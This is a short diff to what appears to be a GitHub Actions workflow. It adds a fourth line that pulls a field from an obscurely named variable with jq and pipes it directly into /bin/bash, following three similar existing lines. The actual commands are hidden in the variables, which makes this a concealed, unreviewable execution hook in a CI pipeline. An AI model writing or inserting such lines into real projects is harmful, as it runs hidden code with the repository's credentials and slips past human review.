@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$i16" | jq -r .kv86 | /bin/bash
           echo $kzrty274 | jq -r .wmbl4507 | /bin/bash
           echo $zwe1 | jq -r .a8419 | /bin/bash
+          printf '%s' "$hwjs9" | jq -r .xc83 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
